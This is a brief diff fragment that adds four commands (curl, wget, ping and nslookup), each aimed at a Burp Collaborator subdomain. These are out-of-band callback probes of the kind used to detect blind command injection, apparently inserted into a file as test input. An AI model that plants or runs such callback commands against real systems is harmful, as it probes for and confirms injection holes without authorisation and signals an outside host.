@@ -1,0 +1,4 @@
+curl http://qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net/curl
+wget http://qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net/wget
+ping ping.qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net
+nslookup ns.qysxxudn9pcq3e1cj829sb9f2681wq.burpcollaborator.net
